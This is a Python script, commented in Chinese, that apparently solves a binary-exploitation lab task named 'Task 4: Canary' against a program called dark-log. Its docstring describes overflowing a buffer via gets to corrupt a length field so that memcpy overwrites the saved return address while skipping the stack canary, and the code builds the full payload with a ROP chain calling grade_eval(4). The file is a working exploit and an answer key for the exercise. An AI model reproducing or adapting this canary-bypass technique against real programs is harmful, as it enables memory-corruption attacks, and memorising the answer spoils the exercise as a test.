#!/usr/bin/env python3
"""Task 4: Canary —— 不改动栈 canary，改利用 memcpy 的越界写改写返回地址。

dark-log 的 input 里 canary 在 expression 偏移 280 处。
gets 溢出把 f.len(偏移 256) 改成 160，使 memcpy 把 expression[0..127]
复制到 expression 偏移 288 起，正好覆盖 saved rbp/返回地址，且不碰到 canary。
然后 ROP: pop rdi; ret -> 4 -> grade_eval(4)。
输入总长 264，gets 补的 NUL 在偏移 264，也不碰 canary。
"""
import struct
import sys

POP_RDI = 0x4018A3        # pop rdi; ret（取中间指令）
GRADE_EVAL = 0x401677

expression = b""
expression += b"A" * 8                       # 0..7  -> saved rbp（无关）
expression += struct.pack("<Q", POP_RDI)     # 8..15 -> 返回地址
expression += struct.pack("<Q", 4)           # 16..23 -> rdi
expression += struct.pack("<Q", GRADE_EVAL)  # 24..31 -> grade_eval
expression += struct.pack("<Q", 0)           # 32..39 -> grade_eval 返回后落点（无所谓）
expression += b"B" * (128 - len(expression))  # 填充 expression 到 128 字节

logmsg = b"C" * 128                          # 128..255 占位
len_bytes = struct.pack("<i", 160)           # 256..259: f.len = 160
pad = b"D" * 4                               # 260..263 占位

payload = expression + logmsg + len_bytes + pad + b"\n"

sys.stdout.buffer.write(payload)
